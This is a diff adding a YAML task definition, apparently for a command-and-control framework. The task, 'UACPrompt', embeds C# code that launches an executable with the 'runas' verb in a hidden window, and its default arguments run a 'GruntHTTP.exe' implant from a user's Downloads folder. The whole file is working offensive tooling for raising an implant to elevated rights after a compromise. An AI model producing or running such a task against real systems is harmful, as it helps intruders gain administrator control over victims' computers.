@@ -1,0 +1,54 @@
+- Name: UACPrompt
+  Aliases: []
+  Author:
+    Name: Chinedu
+    Handle: ''
+    Link: ''
+  Description: Brings up prompt for user to say yes or no for elevated execution
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "using System;\nusing System.Diagnostics;\nusing System.Collections;\nusing System.IO;\n\n\n\n    public class Task\n    {\n        public static string Execute(string ExecutablePath, string Arguments)\n        {\n                if (!File.Exists(ExecutablePath)) {return \"Executable Path does not exist\";}\n                Process proc = new Process();  \n                ProcessStartInfo info = new ProcessStartInfo(ExecutablePath, Arguments);\n                info.WindowStyle = ProcessWindowStyle.Hidden;\n                info.UseShellExecute = true;\n                info.Verb = \"runas\";\n                proc.StartInfo = info;\n                try \n                {\n                  proc.Start();\n                  return \"User Accepted\"; \n                } catch {return \"User Declined\";}\n                   \n            \n        }\n    }\n"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ExecutablePath
+    Value: C:\Windows\System32\cmd.exe
+    DefaultValue: ''
+    Description: Path to executable
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Arguments
+    Value: /c C:\Users\pytha\Downloads\GruntHTTP.exe
+    DefaultValue: ''
+    Description: Arguments
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: System.dll
+    Location: net40/System.dll
+    DotNetVersion: Net40
+  - Name: System.Core.dll
+    Location: net40/System.Core.dll
+    DotNetVersion: Net40
+  - Name: mscorlib.dll
+    Location: net40/mscorlib.dll
+    DotNetVersion: Net40
+  - Name: System.dll
+    Location: net35/System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35/System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net35/mscorlib.dll
+    DotNetVersion: Net35
+  EmbeddedResources: []
